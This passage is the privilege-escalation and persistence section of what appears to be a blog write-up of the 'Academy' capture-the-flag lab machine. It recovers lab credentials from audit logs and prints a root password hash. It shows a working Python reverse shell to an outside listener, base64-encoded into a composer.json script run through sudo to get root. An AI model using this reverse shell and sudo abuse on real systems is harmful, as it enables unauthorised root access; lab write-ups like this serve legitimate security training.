1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/02c22db3bfff4e49b5b6b481c0fc1cd1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking sudo permissions:</span></span><div id="https://www.notion.so/9b34235dbf9e42c0837b44b3847239d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo -l</code></span></span></p></div><div id="https://www.notion.so/616896dcde1a44a1945b831d5658ef72" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Cannot run sudo.</span></span></p></div></li><li id="https://www.notion.so/02f60fd0542247cfab2d18ca286d5aa5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking group permissions:</span></span><div id="https://www.notion.so/6c9fdde2e5454f0993392b0efea193ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/984683a37f924223a3864f99a484abc1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)</span></span></span></code></pre></li><li id="https://www.notion.so/653091cab1804976bd0adae7a676a929" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Since cry0l1t3 is in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">4(adm)</code></span><span class="SemanticString"> admin group, this means we should be able to read syslog. While reading the log files, we discover some hexadecimal data in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/log/audit</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/a52f047baef64d09956e50d4faf99f42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd /var/log/audit &amp;&amp; cat * | grep data= | rev | cut -d= -f1 | rev</code></span></span></p></div><pre id="https://www.notion.so/a58af34bfb6d49b0b9ed8bcb59940d86" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>7375206D7262336E0A
6D7262336E5F41634064336D79210A
77686F616D690A
657869740A
2F62696E2F62617368202D690A
1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
3618790D
63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
657869740A
2F62696E2F62617368202D690A
6973746F72790D686973746F72790D657869740D
657869740A</span></span></span></code></pre></li><li id="https://www.notion.so/18d665f858144e7e997c93adbaa3c69a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can convert the hexadecimal data to ASCII with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">xxd</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/a2ce23b0725f45e8a61a6acc8701ec6b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd /var/log/audit &amp;&amp; cat * | grep data= | rev | cut -d= -f1 | rev | xxd -p -r</code></span></span></p></div><pre id="https://www.notion.so/93c83078c5424f519a02410e76bf65d2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>exithistory
su mrb3n
mrb3n_Ac@d3my!
whoami
exit
/bin/bash -i</span></span></span></code></pre></li><li id="https://www.notion.so/56d929b8cd0a42d2aca881184df84842" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found credentials in the audit log file:</span></span><div id="https://www.notion.so/0ab9325bcbd34b079a7754a96c219298" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mrb3n:mrb3n_Ac@d3my</code></span><span class="SemanticString"> </span></span></p></div></li><li id="https://www.notion.so/4bbb45b6393048dcbfc1090feb1c3564" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">SSH in as mrb3n:</span></span><div id="https://www.notion.so/7308d80f758c4acc8efb6987ae993aa5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh mrb3n@10.10.10.215</code></span></span></p></div></li><li id="https://www.notion.so/ce94c0d039264aeb83bd8752e787a8ff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking sudo permissions:</span></span><div id="https://www.notion.so/84f1e3d4b34f48d2bb37694ac6cedb17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo -l</code></span></span></p></div><pre id="https://www.notion.so/807b16af28ab48cbacd55752e67af0fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Matching Defaults entries for mrb3n on academy:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User mrb3n may run the following commands on academy:
	(ALL) /usr/bin/composer</span></span></span></code></pre></li><li id="https://www.notion.so/abe7d1dd3db24acd840842deb64ef139" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">mrb3n can run dependency manager </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/usr/bin/composer</code></span><span class="SemanticString"> as root, which is a possible vector for privilege escalation if we can get Composer to execute arbitrary scripts.</span></span></li><li id="https://www.notion.so/d0d7723c30264df4acdbab769a766d69" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using the following Python reverse shell:</span></span><pre id="https://www.notion.so/43b761fa19394e1aa5fd70cb5ea2586a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> socket<span class="token punctuation">,</span> subprocess<span class="token punctuation">;</span>

s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'10.10.14.53'</span><span class="token punctuation">,</span><span class="token number">6969</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
	proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>proc<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre></li><li id="https://www.notion.so/a5f04fdcc7194ec5861ee796fdde082c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Encode the payload to base64:</span></span><pre id="https://www.notion.so/bf434769aca1412b95a1d5b997f76f41" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjUzJyw2OTY5KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=</span></span></span></code></pre></li><li id="https://www.notion.so/e87f3d629e9849fda85b6ca4e8bd5501" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Write to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">composer.json</code></span><span class="SemanticString"> the following:</span></span><pre id="https://www.notion.so/983bd97138d847668fd0ae679ba2305d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">{</span>
	<span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
		<span class="token property">"pwn"</span><span class="token operator">:</span> <span class="token string">"python3 -c \"import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjUzJyw2OTY5KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk='))\""</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span></span></span></span></code></pre></li><li id="https://www.notion.so/a5539f527bad46d7981da4dbeed44f57" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Before running the script, setup a listener for the reverse shell:</span></span><div id="https://www.notion.so/dd5ef97a0f5a4685b9e30112820df571" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/ec3368d2e813447f94a4bb09286c1b97" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Execute script with composer:</span></span><div id="https://www.notion.so/af07453769d6435f9fd925c9223e44aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo composer run-script --timeout=0 pwn</code></span></span></p></div></li><li id="https://www.notion.so/9688e82d513c4b16957e97faa133ac75" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After a few seconds, we should get a reverse shell as root:</span></span><div id="https://www.notion.so/2067952e47ff4710afb71ea58cccaebd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/66d207cc812641289e65a80c7bb0a1b6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre></li><li id="https://www.notion.so/87ec6071b6e543c8979394f1e9f35e24" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/8d22982089de4c139bb4e031eb97fe90" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/8d22982089de4c139bb4e031eb97fe90"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/381f93f2109e4d919ce8753850ba393e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root hash from the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString"> file:</span></span><pre id="https://www.notion.so/a91a913278f1416396ea6d965657c7cd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root<span class="token operator">:</span>$<span class="token number">6</span>$Haots4JVo2R7o2wP$XxlDAw9FgIGHZapROvxiKByJrGiZT0KHkoB9mLC4npT9wDOFsO3p9ad0ScF3tCKT.hk7uweN7KDK4EcmBEKv./<span class="token operator">:</span><span class="token number">18481</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">99999</span><span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span><span class="token operator">:</span><span class="token operator">:</span></span></span></span></code></pre></li><li id="https://www.notion.so/e742fecc2ce142cf98eb62a0f776dd0c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.env</code></span><span class="SemanticString"> file exposure on Laravel 5.5.21 (CVE-2017-16894) means we could have just read the database credentials directly from </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.215/academy/.env">http://10.10.10.215/academy/.env</a></span><span class="SemanticString">, skipping the need for a www-data shell.</span></span></li></ul><h2 id="https://www.notion.so/b6e967bdc9a84d328654781eaa3a2f2b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/b6e967bdc9a84d328654781eaa3a2f2b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/a81330b9a1dc4dbeb638637a59c0a17b" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://nvd.nist.gov/vuln/detail/CVE-2018-15133">https://nvd.nist.gov/vuln/detail/CVE-2018-15133</a></span></span></li><li id="https://www.notion.so/f2ba1b4d52904d59a6d33e47ef84f3e4" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://nvd.nist.gov/vuln/detail/CVE-2017-16894">https://nvd.nist.gov/vuln/detail/CVE-2017-16894</a></span></span></li><li id="https://www.notion.so/d4b3d7a7e9e840d88ef9260a23501cb6" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups">https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups</a></span></span></li><li id="https://www.notion.so/9720da2e335e4438b0e7066c2605e5ca" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://getcomposer.org/doc/articles/scripts.md">https://getcomposer.org/doc/articles/scripts.md</a></span></span></li><li id="https://www.notion.so/f79d2b02808944ee8a54cb70ae26a169" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gtfobins.github.io/gtfobins/composer/">https://gtfobins.github.io/gtfobins/composer/</a></span></span></li></ol></article>
  <footer class="Footer">
  <div>samiko@127.0.0.1~$</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
</footer>
</body>

</html>